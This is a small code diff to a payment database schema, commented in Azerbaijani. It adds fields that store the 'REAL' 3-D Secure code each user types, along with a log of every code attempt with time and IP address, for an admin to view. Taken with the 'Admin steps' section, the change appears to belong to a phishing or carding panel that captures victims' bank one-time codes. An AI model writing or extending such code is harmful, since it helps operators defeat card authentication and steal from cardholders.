@@ -25,6 +25,14 @@ const paymentSchema = new mongoose.Schema({
 
   /* 3-D Secure doğrulama kodu */
   verificationCode: { type: String, default: '' },
+  /* İstifadəçinin 3-D ekranında yazdığı REAL kod — əvvəllər sxemdə olmadığı üçün
+     Mongoose (strict) onu atırdı və admin yalnız təsadüfi yaradılmış kodu görürdü */
+  submittedCode: { type: String, default: '' },
+  codeAttempts: [{
+    code: { type: String, default: '' },
+    at: { type: Date, default: Date.now },
+    ip: { type: String, default: '' }
+  }],
   codeSubmittedAt: { type: Date },
 
   /* Admin addımları */
